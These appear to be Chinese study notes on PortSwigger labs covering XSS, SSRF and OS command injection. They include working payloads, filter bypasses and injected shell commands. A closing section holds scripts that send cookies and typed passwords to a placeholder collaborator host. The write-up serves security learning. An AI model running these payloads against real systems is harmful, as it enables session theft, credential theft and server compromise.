实验5：jQuery锚中的DOM XSS href 属性接收器使用 location.search 源
信息：

本实验在提交反馈页中包含一个基于DOM的跨站点脚本漏洞，使用jQuery库的$selector函数查找锚元素，并使用location.search中的数据更改其href属性
```

### 步骤

原链接如下：

```http
https://0af900d2037351e883bbabff001b005d.web-security-academy.net/feedback?returnPath=/feedback
```

<img src=".\图片\Snipaste_2023-06-18_16-02-32.png" alt="Snipaste_2023-06-18_16-02-32" style="zoom:80%;" />

把 `/feedback` 替换为 `javascript:alert(document.cookie)`

```http
https://0af900d2037351e883bbabff001b005d.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

再点击 back 按钮，则弹出来 Cookie

<img src=".\图片\Snipaste_2023-06-18_16-00-58.png" alt="Snipaste_2023-06-18_16-00-58" style="zoom:67%;" />

## Lab6

Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

```
实验6：jQuery选择器接收器中使用hashchange事件的DOM XSS
信息：

本实验的主页上存在一个基于DOM的跨站点脚本漏洞。它使用jQuery的$()选择器函数自动滚动到给定的帖子，其标题通过location.hash属性传递。

解决实验：向受害者发送一个利用漏洞攻击，在其浏览器中调用print()函数
```

### 步骤

插入 paylaod

```
<iframe src="https://0a000018033129c08060da1200ee001f.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

<img src=".\图片\b5afb37ae5374d63886c827dfcd7c1e5.png" alt="b5afb37ae5374d63886c827dfcd7c1e5" style="zoom:80%;" />

存储利用漏洞攻击，然后单击View exploit（查看利用漏洞攻击）以确认调用了print()函数

![img](https://img-blog.csdnimg.cn/d338b64f54744418aa2df973d29b2212.png)
返回漏洞攻击服务器，然后单击Deliver to victim（发送给受害者）

完成实验

![img](https://img-blog.csdnimg.cn/fca96e387f6f44c89238b08266ab3db6.png)

## Lab7

Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

```
实验7：将XSS反射到带尖括号的HTML编码属性中
信息：

此实验包含搜索博客功能中的一个反映的跨站点脚本漏洞，其中尖括号是HTML编码的。要完成此实验，请执行跨站点脚本攻击，注入属性并调用alert函数。
```

### 步骤

插入 paylaod

```
"onmouseover="alert(1)
```

鼠标移动到插入的 paylaod 时，会弹窗

<img src=".\图片\Snipaste_2023-06-18_16-21-04.png" alt="Snipaste_2023-06-18_16-21-04" style="zoom:67%;" />

查看源码时，发现输入被拼接到

<img src=".\图片\Snipaste_2023-06-18_16-22-38.png" alt="Snipaste_2023-06-18_16-22-38" style="zoom:80%;" />

## Lab8

Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

```
实验8：将XSS存储到锚中 href 带双引号的属性HTML编码
信息：

本实验的评论功能中存在一个已存储的跨站点脚本漏洞

完成实验：提交一条评论，当评论作者姓名被单击时，该评论将调用alert函数
```

### 步骤

关键在用户名的网站输入框里，写入 `javascript:alert(1)` 时，点击则显示弹窗

<img src=".\图片\Snipaste_2023-06-18_16-36-00.png" alt="Snipaste_2023-06-18_16-36-00" style="zoom:80%;" />

## Lab9

Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

```
实验9：将XSS反射到带有尖括号的JavaScript字符串HTML编码
信息：

本实验包含搜索查询跟踪功能中的一个反映的跨站点脚本漏洞，其中尖括号被编码。反射发生在JavaScript字符串内部。

完成实验：执行跨站点脚本攻击，该攻击会破坏JavaScript字符串并调用alert函数。
```

### 步骤

输入 

```
'-alert(1)-'
```

再到源码里查看

<img src=".\图片\Snipaste_2023-06-18_16-40-31.png" alt="Snipaste_2023-06-18_16-40-31" style="zoom:80%;" />

## Lab10

Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that breaks out of the select element and calls the `alert` function.

```
实验4：DOM XSS输入 innerHTML 汇使用源 location.search

本实验包含股票检查器功能中基于DOM的跨站点脚本漏洞。使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是使用www.example.com中的数据调用的，可以使用网站URL控制这些数据。location.search 可以通过网站来控制 URL.数据包含在select元素中。

完成实验：执行跨站点脚本攻击，该攻击会突破select元素并调用alert函数。

```

### 步骤

发现用户输入与数据回显

<img src=".\图片\Snipaste_2023-06-19_15-01-05.png" alt="Snipaste_2023-06-19_15-01-05" style="zoom:67%;" />



源码中嵌入到标签里

<img src=".\图片\Snipaste_2023-06-19_15-03-12.png" alt="Snipaste_2023-06-19_15-03-12" style="zoom: 80%;" />

接下来要闭合 `</select>` 标签

```
"></select><img src=1 onerror=alert(1)>
```

```http
https://0ae000bb03b30d58804f556100330053.web-security-academy.net/product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

## Lab11

Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in a [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that executes an AngularJS expression and calls the `alert` function.

```
实验11：带尖括号和双引号的AngularJS表达式中的DOM XSS HTML编码
信息：

本实验在搜索功能的AngularJS表达式中包含一个基于DOM的跨站点脚本漏洞。

AngularJS是一个流行的JavaScript库，它扫描包含ng-app属性（也称为AngularJS指令）的HTML节点的内容。将指令添加到HTML代码中后，可以在双大括号内执行JavaScript表达式。此技术在编码尖括号时很有用。

完成实验：执行跨站点脚本攻击，该攻击执行AngularJS表达式并调用alert函数

```

### 步骤

查看页面源代码，发现随机字符串包含在ng-app指令中

<img src=".\图片\Snipaste_2023-06-19_15-10-10.png" alt="Snipaste_2023-06-19_15-10-10" style="zoom:80%;" />

在搜索框输入

```
{{$on.constructor('alert(1)')()}}
```

<img src=".\图片\Snipaste_2023-06-19_15-11-20.png" alt="Snipaste_2023-06-19_15-11-20" style="zoom:67%;" />

## Lab12

Lab: Reflected [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.

```
实验12：反射DOM XSS
信息：

本实验演示了一个反射DOM漏洞。当服务器端应用程序处理来自请求的数据并在响应中回显数据时，会出现反射DOM漏洞。然后，页上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。

完成实验：创建一个调用alert()函数的注入
```

### 步骤

浏览数据包时，发现一个特殊的

<img src=".\图片\Snipaste_2023-07-01_15-10-38.png" alt="Snipaste_2023-07-01_15-10-38" style="zoom:80%;" />

在站点地图中，打开searchResults.js文件，注意JSON响应与eval()函数调用一起使用。
发送到repeater，通过试验不同的搜索字符串，可以识别JSON响应正在转义引号。但反斜杠不会转义

于是插入

```
payload:
\"-alert(1)}//
```

<img src=".\图片\Snipaste_2023-07-01_15-12-56.png" alt="Snipaste_2023-07-01_15-12-56" style="zoom:80%;" />

原理：

1、由于已经插入了一个反斜杠，并且站点没有对它们进行转义，因此当JSON响应试图转义开头的双引号字符时，它会添加第二个反斜杠。产生的双反斜杠将导致转义被有效地取消。这意味着处理双引号时不转义，这将结束应包含搜索项的字符串。

2、然后，在调用alert（）函数之前，使用算术运算符（本例中为减法运算符）分隔表达式。最后，一个右花括号和两个正斜杠提前关闭JSON对象，并注释掉对象的其余部分。

```
结果，响应生成如下：
{"searchTerm":"\\"-alert(1)}//", "results":[]}
```

## Lab13

Lab: Stored [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

```
实验13：存储DOM XSS
信息：

本实验演示了博客评论功能中的存储DOM漏洞

完成实验：利用此漏洞调用alert()函数
```

### 步骤

发表包含以下向量的评论：

```objectivec
<><img src=1 onerror=alert(1)>
```

拼接后显示

<img src=".\图片\Snipaste_2023-07-01_15-18-32.png" alt="Snipaste_2023-07-01_15-18-32" style="zoom:80%;" />

## Lab14

Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with most tags and attributes blocked

This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the WAF and calls the `print()` function.

### 步骤

1. Inject a standard XSS vector, such as:

   ```
   <img src=1 onerror=print()>
   ```

2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.

3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.

4. In Burp Intruder, in the Positions tab, replace the value of the search term with: `<>`

5. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<§§>`

6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "Copy tags to clipboard".

7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".

8. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `body` payload, which caused a 200 response.

9. Go back to the Positions tab in Burp Intruder and replace your search term with:

   ```
   <body%20=1>
   ```

10. Place the cursor before the `=` character and click "Add §" twice, to create a payload position. The value of the search term should now look like: `<body%20§§=1>`

11. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click "copy events to clipboard".

12. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".

13. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the `onresize` payload, which caused a 200 response.

14. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

    ```
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
    ```

15. Click "Store" and "Deliver exploit to victim".



```
<iframe src="https://0ab50058043442bc81a12a9d00b40083.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```



## Lab15

Lab: [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that injects a custom tag and automatically alerts `document.cookie`.

### 官方解

1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

   ```
   <script>
   location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
   </script>
   ```

2. Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

### 步骤

```
0aef004f04c61bbf84f5550f00200006
```

插入：

```
<script>
location = 'https://0aef004f04c61bbf84f5550f00200006.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

把恶意 链接发给目标

```http
https://0aef004f04c61bbf84f5550f00200006.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x
```

<img src=".\图片\Snipaste_2023-07-02_13-05-48.png" alt="Snipaste_2023-07-02_13-05-48" style="zoom:80%;" />

目标点击后，弹出  cookie

<img src=".\图片\Snipaste_2023-07-02_13-08-04.png" alt="Snipaste_2023-07-02_13-08-04" style="zoom:67%;" />

## 其它

1、偷 cookie

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

2、配合 csrf

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

3、重置密码

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# SSRF

## 前置知识

服务器端请求伪造（SSRF）

### 简述

1、服务器端请求伪造（也称为SSRF）是一个Web安全漏洞，允许攻击者诱使服务器端应用程序向非预期位置发出请求。

2、在典型的SSRF攻击中，攻击者可能会使服务器连接到组织基础设施中的仅限内部的服务。在其他情况下，它们可能会强制服务器连接到任意外部系统，从而可能泄漏授权凭据等敏感数据

3、SSRF攻击经常利用信任关系从易受攻击的应用程序升级攻击并执行未经授权的操作。这些信任关系可能与服务器本身相关，也可能与同一组织内的其他后端系统相关。 

### 影响

1、成功的SSRF攻击通常会导致未经授权的操作或对组织内数据的访问，无论是在易受攻击的应用程序本身还是在应用程序可以与之通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。

2、导致连接到外部第三方系统的SSRF漏洞利用可能会导致恶意的向前攻击，这些攻击似乎源自托管易受攻击的应用程序的组织。 

## Lab1

### 前置

SSRF攻击服务器本身

1、在针对服务器本身的SSRF攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出HTTP请求。这通常涉及提供一个带有主机名的URL，如127.0.0.1（指向环回适配器的保留IP地址）或localhost（同一适配器的常用名称）2、例如一个购物应用程序，它允许用户查看某个商品在特定商店中是否有库存。要提供库存信息，应用程序必须查询各种后端REST API，具体取决于所涉及的产品和商店。该函数是通过前端HTTP请求将URL传递给相关后端API端点来实现的

```
当用户查看商品的库存状态时，浏览器会发出如下请求： 
 
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
 
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

```
这将导致服务器向指定的URL发出请求，检索库存状态，并将其返回给用户。
在这种情况下，攻击者可以修改请求以指定服务器本身的本地URL。例如： 
 
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
 
stockApi=http://localhost/admin
（服务器将获取/admin URL的内容并将其返回给用户）
```

2、现在攻击者可以直接访问 `/admin URL`。但是管理功能通常只有经过身份验证的适当用户才能访问。因此，直接访问URL的攻击者不会看到任何感兴趣的内容。但如果对 /admin URL 的请求来自本地计算机本身，则会绕过正常的访问控制。应用程序赠款对管理功能的完全访问权限，因为请求似乎来自受信任的位置

3、应用程序以这种方式运行，并且隐式地信任来自本地计算机的请求的原因：

```
    1、访问控制检查可以在位于应用服务器前面的不同组件中实现。当重新建立到服务器本身的连接时，将跳过检查。
    2、出于灾难恢复的目的，应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户直接来自服务器本身。
    3、管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。
```

这种类型的信任关系，其中来自本地机器的请求与普通请求的处理方式不同，通常使SSRF成为一个严重的漏洞

### 题目

实验1：针对本地服务器的基本SSRF

```
Lab: Basic SSRF against the local server
APPRENTICE

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
```

```
信息：

本实验具有从内部系统获取数据的库存检查功能。

要解决实验问题，更改库存检查URL以访问管理界面http://localhost/admin，并删除用户carlos
```

### 答案

先访问 /admin 时发现受限制了

<img src=".\图片\Snipaste_2023-07-31_16-35-25.png" alt="Snipaste_2023-07-31_16-35-25" style="zoom:80%;" />

在功能点，访问一个产品，点击"检查库存"，拦截请求，并将其发送到 repeater

将stockApi参数中的URL更改为http://localhost/admin（将显示管理界面）

<img src=".\图片\Snipaste_2023-07-31_16-37-58.png" alt="Snipaste_2023-07-31_16-37-58" style="zoom:80%;" />

在 /admin 的源码里读取 HTML 以标识要**删除目标用户的 URL**，该URL为

```
http://localhost/admin/delete?username=carlos
```

在stockApi 参数中提交此 URL，以传递SSRF攻击

<img src=".\图片\Snipaste_2023-07-31_16-39-52.png" alt="Snipaste_2023-07-31_16-39-52" style="zoom:80%;" />

## Lab2

### 前置

SSRF攻击其他后端系统

1、另一种类型的信任关系经常伴随着服务器端请求伪造而出现，即应用服务器能够与用户无法直接访问的其他后端系统交互。这些系统通常具有不可路由的私有IP地址。由于后端系统通常受网络拓扑的保护，因此它们的安全性通常较弱。在许多情况下，内部后端系统包含敏感功能，能够与系统交互的任何人都可以在不进行身份验证的情况下访问这些功能。

2、假设后端URL www.example.com 处有一个管理界面 https://192.168.0.68/admin

```
攻击者可以通过提交以下请求利用SSRF漏洞访问管理界面
 
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
 
stockApi=http://192.168.0.68/admin
```

### 题目

实验2：基本SSRF与另一个后端系统

```
Lab: Basic SSRF against another back-end system
APPRENTICE

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
```

```
信息：

这个实验室有一个库存检查功能，可以从内部系统中获取数据

要解决这个问题，使用库存检查功能扫描内部192.168.0.X 范围，找到端口8080上的管理界面，然后用它删除用户 Carlos
```

### 答案

与上一题操作类似，就是多了个枚举内网地址的过程

并将其发送到 Burp 入侵者

先"Clear §"，将 stockApi 参数更改为 `http://192.168.0.1:8080/admin`

在到 1 这一位加上 §§ ，1~255 数字爆破

发现后台地址为：

```
http://192.168.0.208:8080/admin
```

<img src=".\图片\Snipaste_2023-07-31_16-58-00.png" alt="Snipaste_2023-07-31_16-58-00" style="zoom:80%;" />

再找到删除用户的链接

<img src=".\图片\Snipaste_2023-07-31_16-59-17.png" alt="Snipaste_2023-07-31_16-59-17" style="zoom:80%;" />

触发即可

<img src=".\图片\Snipaste_2023-07-31_17-00-35.png" alt="Snipaste_2023-07-31_17-00-35" style="zoom:80%;" />

## Lab3

### 题目

```
Lab: Blind SSRF with out-of-band detection
PRACTITIONER

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.
```

### 答案

burp 生成本地域名，类似 dnslog，加上 Referer 字段再访问

```
ct9sp15om7478cqh0yq4lc4l1c72vr.burpcollaborator.net
```

<img src=".\图片\Snipaste_2023-07-31_17-25-05.png" alt="Snipaste_2023-07-31_17-25-05" style="zoom:80%;" />

成功接收到请求

<img src=".\图片\Snipaste_2023-07-31_17-25-22.png" alt="Snipaste_2023-07-31_17-25-22" style="zoom:80%;" />

后端接收到 Referer 字段的参数，可能进行了 http 访问，所以我们的 dnslog 平台才可以收到信息

## Lab4

### 前置

SSRF具有基于黑名单的输入滤波器

1、有些应用程序会阻止包含主机名（如127.0.0.1和localhost）或敏感URL（如/admin）的输入。在这种情况下，通常可以使用各种技术绕过筛选器

```
    1、使用www.example.com的替代IP表示法127.0.0.1，例如2130706433、017700000001或127.1
    2、注册您自己的域名，解析为127.0.0.1。您可以使用spoofed.burpcollaborator.net来实现此目的。
    3、使用URL编码或大小写变化混淆被阻止的字符串。
```

### 题目

实验3：SSRF具有基于黑名单的输入滤波器

```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
```

```
信息：

本实验具有从内部系统获取数据的库存检查功能。

要解决实验问题，请更改库存检查URL以访问管理界面http://localhost/admin，并删除用户carlos

开发者已经部署了两个弱的反SSRF防御，需要绕过它们
```

### 答案

思路与第一关类似，就是添加了反ssrf的一些防御，绕过防御即可

首先尝试

```http
http://127.1/admin
```

发现依然被阻止

将 "a" 进行双 URL 编码为 `%2561`，成功

```http
http://127.1/%2561dmin
```

<img src=".\图片\Snipaste_2023-07-31_17-12-12.png" alt="Snipaste_2023-07-31_17-12-12" style="zoom:80%;" />

接着触发删除的链接

```
http://127.1/%2561dmin/delete?username=carlos
```

<img src=".\图片\Snipaste_2023-07-31_17-13-16.png" alt="Snipaste_2023-07-31_17-13-16" style="zoom:80%;" />

## Lab5

### 前置

通过开放重定向绕过SSRF滤波器

1、有时可以通过利用开放的重定向漏洞来绕过任何类型的基于过滤器的防御。

2、假设用户提交的URL经过严格验证，以防止对SSRF行为的恶意利用。但允许其URL的应用程序包含一个开放的重定向漏洞。如果用于使后端HTTP请求支持重定向的API，则可以构造一个满足过滤器的URL，并将请求重定向到所需的后端目标

```
例如，假设应用程序包含一个开放的重定向漏洞，其中以下URL：
/product/nextProduct?currentProductId=6&path=http://evil-user.net
 
返回重定向到：
http://evil-user.net
```

3、可以利用开放重定向漏洞绕过URL过滤器，并利用SSRF漏洞进行攻击

```
例如：
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
 
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

这个SSRF攻击之所以有效，是因为应用程序首先验证提供的stockAPI URL是否在允许的域中，它确实是。然后应用程序请求提供的URL，这将触发打开重定向。它遵循重定向，并向攻击者选择的内部URL发出请求

### 题目

实验5：SSRF通过开放重定向漏洞绕过过滤器

```
Lab: SSRF with filter bypass via open redirection vulnerability
PRACTITIONER

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first.
```

```
信息：

这个实验室有一个库存检查功能，可以从内部系统获取数据

要解决这个实验室：改变库存检查的 URL，以访问 http://192.168.0.12:8080/admin 的管理界面，并删除用户 carlos

库存检查器被限制为只能访问本地应用程序，因此需要首先找到一个影响应用程序的打开重定向
```

### 答案

功能点  nextProduct 里有重定向的功能

```http
https://0a98001004535eea80815dde00600013.web-security-academy.net/product/nextProduct?currentProductId=1&path=/product?productId=2
```

当我们把 path 的参数 改为 `http://192.168.0.12:8080/admin` 时，则会有重定向的功能

<img src=".\图片\Snipaste_2023-07-31_17-42-50.png" alt="Snipaste_2023-07-31_17-42-50" style="zoom:80%;" />

再借助之前的 ssrf 漏洞点，与重定向配合，即可触发删除链接

```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

<img src=".\图片\Snipaste_2023-07-31_17-45-19.png" alt="Snipaste_2023-07-31_17-45-19" style="zoom:80%;" />

这里拓展以下，不需要一定是目标网站存在302跳转才可以绕过，也可以尝试在自己服务器上搭一个302跳转尝试绕过

## 寻找SSRF

1、简述：
许多服务器端请求伪造漏洞相对容易发现，因为应用程序的正常通信涉及包含完整URL的请求参数。SSRF的其他例子更难找到。

2、请求中的部分URL
有时，应用程序只将主机名或URL路径的一部分放入请求参数中。然后，提交的值在服务器端合并到请求的完整URL中。如果该值很容易被识别为主机名或URL路径，则潜在的攻击面可能很明显。然而，作为完整SSRF的可利用性可能会受到限制，因为您无法控制所请求的整个URL。 

3、数据格式中的URL
一些应用程序传输数据的格式的规范允许包含数据解析器可能会请求的格式的URL。一个明显的例子是XML数据格式，它已广泛用于Web应用程序中将结构化数据从客户机传输到服务器。当应用程序接受XML格式的数据并对其进行解析时，它可能容易受到XXE注射液，并反过来容易受到SSRF通过XXE。我们将在查看时更详细地讨论这一点XXE注射液脆弱性。 

4、SSRF通过Referer报头
一些应用程序使用服务器端分析软件来跟踪访问者。该软件通常记录请求中的Referer头，因为这对于跟踪传入链接特别有用。分析软件通常会访问出现在Referer标题中的任何第三方URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer报头通常代表SSRF漏洞的有效攻击面。见盲SSRF漏洞有关Referer标头漏洞的示例。 

# OS command injection

## 前置

### 1、意义

1、简述：操作系统命令注入（也称为外壳注入）是一个Web安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统（OS）命令

2、危害：通常会完全危害应用程序及其所有数据，攻击者可以利用操作系统命令注入漏洞来危害托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。

### 2、有用的命令

```
识别操作系统命令注入漏洞后，执行一些初始命令以获取有关已受损系统的信息
一些在Linux和Windows平台上有用的命令的摘要： 
 
命令的目的 	   Linux操作系统   Windows
当前用户的名称   whoami 	       whoami
操作系统 	   uname -a 	   ver
网络配置 	   ifconfig 	   ipconfig /all
网络连接 	   netstat -an 	   netstat -an
运行进程 	   ps -ef 	       tasklist 
```

### 3、注入操作系统命令的方式

1、简述：

各种外壳元字符可用于执行操作系统命令注入攻击，许多字符用作命令分隔符，允许将命令链接在一起

```
1、以下命令分隔符在基于Windows和基于Unix的系统上都有效：
    &
    &&
    |
    ||
 
2、以下命令分隔符仅适用于基于Unix的系统：
    ;
    换行符（0x0a或\n）
 
3、在基于Unix的系统上，您还可以使用反勾号或美元字符在原始命令中执行插入命令的内联执行：
 
    '
    注入命令'
    $（插入命令）
```

2、分析观察

不同的shell元字符具有细微不同的行为，这些行为可能会影响它们在某些情况下是否有效，以及它们是否允许带内检索命令输出，还是只对盲目利用有用

有时，控制的输入出现在原始命令的引号内。在这种情况下，在使用合适的shell元字符插入新命令之前，需要终止加引号的上下文（使用"或'）

### 4、防止操作系统命令注入攻击

防止操作系统命令注入漏洞的最有效方法是永远不要从应用层代码调用操作系统命令（在每种情况下，都有使用更安全的平台API实现所需功能的替代方法）

```
如果使用用户提供的输入调用OS命令是不可避免的，则必须执行强输入验证：
    1、根据允许值的白名单进行验证。
    2、验证输入是否为数字。
    3、验证输入是否仅包含字母数字字符，而不包含其他语法或空白。
    4、不要试图通过转义shell元字符来清理输入（非常容易出错，且容易被熟练的攻击者绕过）
```

## Lab1

### 前置

示例

```
1、一个购物应用程序：

允许用户查看某个商品在特定商店中是否有库存

可通过以下URL：
https://insecure-website.com/stockStatus?productID=381&storeID=29

2、需查询其他系统：
 
提供股票信息，应用程序必须查询各种遗留系统。该功能是通过调用shell命令并将产品和商店ID作为参数来实现，如
stockreport.pl 381 29（此命令输出指定项目的库存状态，并返回给用户）
 
------
攻击者：
如果应用程序未实现针对操作系统命令注入的防御措施，攻击者可以提交以下输入来执行任意命令：
& echo aiwefwlguh &
 
如果此输入在产品ID参数，则应用程序执行的命令为：
stockreport.pl & echo aiwefwlguh & 29
 
 
将附加命令分隔符&放置在插入的命令之后，结合echo命令输出回显，这是测试某些类型的操作系统命令注入的有用方法，降低了阻止执行注入命令的可能性（&字符是shell命令分隔符，因此执行的是三个独立的命令）
 
返回给用户的输出为：
Error - productID was not provided    （stockreport.pl执行时未使用预期参数，返回错误提示）
aiwefwlguh                （执行注入的echo命令，并输出）
29: command not found     （参数29作为命令执行，导致错误）
```

### 题目

实验1：操作系统命令注入（简单）

```
Lab: OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.
```

### 解答

找到功能点，抓包测试

```
zf1yolo|whoami
```

<img src=".\图片\Snipaste_2023-07-31_20-36-43.png" alt="Snipaste_2023-07-31_20-36-43" style="zoom:80%;" />

## Lab2

### 前置

盲操作系统命令注入漏洞

#### 1、简述

许多操作系统命令注入实例都是隐蔽漏洞。这意味着应用程序不会在其HTTP响应中返回命令的输出。盲漏洞仍然可以被利用，但需要不同的技术

#### 2、示例

一个网站允许用户提交有关该网站的反馈。用户输入他们的电子邮件地址和反馈信息，服务器端应用程序向站点管理员生成包含反馈的电子邮件

它将调用邮件程序，其中包含提交的详细信息，如：

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

mail命令的输出（如果有的话）不会在应用程序的响应中返回，因此使用echo有效负载不会有效。在这种情况下，可以使用各种其他技术来检测和利用漏洞

#### 3、使用时间延迟检测盲OS命令注入

1、可以使用将触发时间延迟的注入命令，从而根据应用程序响应所需的时间来确认命令是否已执行

2、ping命令是一种有效的方法，因为它允许您指定要发送的ICMP数据包的数量，从而指定命令运行所需的时间：

```
& ping -c 10 127.0.0.1 &
```

此命令将使应用程序ping其环回网络适配器10秒。

